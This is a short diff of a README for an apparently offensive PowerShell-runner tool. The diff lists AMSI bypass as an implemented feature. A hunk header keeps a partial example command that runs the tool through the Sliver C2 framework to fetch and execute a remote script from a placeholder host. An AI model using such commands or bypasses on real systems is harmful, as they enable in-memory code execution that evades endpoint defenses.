@@ -4,6 +4,7 @@ C# .Net Framework program that uses `RunspaceFactory` for Powershell command exe
 ## Features
 - Execute Powershell commands
 - Load & execute remote script
+- AMSI Bypass
 
 ## Examples
 
@@ -20,7 +21,6 @@ sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -u http://x.x.x.x/PowerV
 - Load & execute script from disk
 - Load & execute script from clipboard
 - Compression & encryption support for scripts
-- AMSI Bypass
 - Multiple command support
 
 ## Build
